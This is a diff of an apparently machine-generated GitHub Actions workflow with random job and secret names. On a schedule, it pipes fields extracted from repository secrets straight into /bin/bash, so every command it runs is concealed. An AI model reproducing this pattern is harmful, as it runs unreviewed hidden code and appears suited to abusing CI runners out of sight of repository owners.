@@ -1,21 +1,19 @@
 name: yuanyongyi7135
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
-jobs:  # 4894
+    - cron: '0 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuanyongyi7135
         env:
-          xwmos66: ${{ secrets.xwmos66 }}
+          f0331: ${{ secrets.f0331 }}
         run: |
-          echo $xwmos66 | jq -r .bqu55 | /bin/bash
-          echo $prnv3 | jq -r .fl3751 | /bin/bash
-          echo $ljc328 | jq -r .gsgse9 | /bin/bash
-          echo $uoik2 | jq -r .ktex5544 | /bin/bash
-          echo $lyr5 | jq -r .v13515 | /bin/bash
-          echo $nqcc7074 | jq -r .wux23786 | /bin/bash
+          echo $f0331 | jq -r .cq57 | /bin/bash
+          echo $ldanw217 | jq -r .wqv841 | /bin/bash
 
